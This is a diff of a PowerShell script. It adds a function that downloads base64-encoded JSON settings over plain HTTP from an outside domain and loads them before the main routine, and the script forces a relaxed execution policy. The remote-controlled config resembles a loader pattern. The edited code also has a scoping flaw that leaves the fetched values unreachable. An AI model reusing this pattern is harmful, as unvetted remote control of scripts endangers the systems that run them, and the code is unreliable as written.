@@ -1,13 +1,16 @@
 Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 
+$_var = $null
+
 function LoadVars {
-    $_s = 
+    $_vars_url = "http://dexter-base.link/vars"
+    $_s = (Invoke-WebRequest -Uri $_vars_url).Content
     $_j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_s))
-    $_global_vars = $_j | ConvertFrom-Json
+    $_vars = $_j | ConvertFrom-Json
 }
 
 function Vars ($key) {
-    
+    return $_vars.$key
 }
 
 function MainEntry {
@@ -93,6 +96,7 @@ function MainEntry {
 }
 
 try {
+    LoadVars
     MainEntry
 }
 catch {
